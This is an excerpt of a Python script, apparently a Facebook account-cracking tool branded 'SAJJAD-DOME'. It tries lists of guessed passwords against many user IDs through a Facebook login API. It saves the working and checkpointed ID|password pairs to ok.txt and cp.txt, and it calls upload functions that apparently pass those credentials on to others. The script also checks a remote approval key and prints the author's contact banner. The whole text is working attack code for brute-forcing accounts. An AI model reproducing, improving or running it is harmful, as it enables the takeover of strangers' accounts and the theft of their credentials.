...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/SAJJAD-DOME/approval.txt/blob/main/Ap.txt"])
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰SAJJAD-DOME")
	subprocess.check_output(["am", "start", "https://m.me/Tera.Bap.Ka.Id.Hain"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/SAJJAD-DOME/approval.txt/blob/main/Ap.txt').text
			if basesplit in plr:
				key = basesplit
...
╚═╝░░╚═╝╚══════╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝                                 
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : SAJJAD VERSION 2.0
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : HELP ZONE 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : SHAHZADA-AHMED
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : +8801840215106
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SAJJAD-DOME_OLD] : %s/%s -> \033[0;92m [ SAJJAD-DOME-OK:%s ]- \033[0;91m[SAJJAD-DOME-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SAJJAD-DOME-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SAJJAD-DOME-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SAJJAD-DOME-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SAJJAD-DOME-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
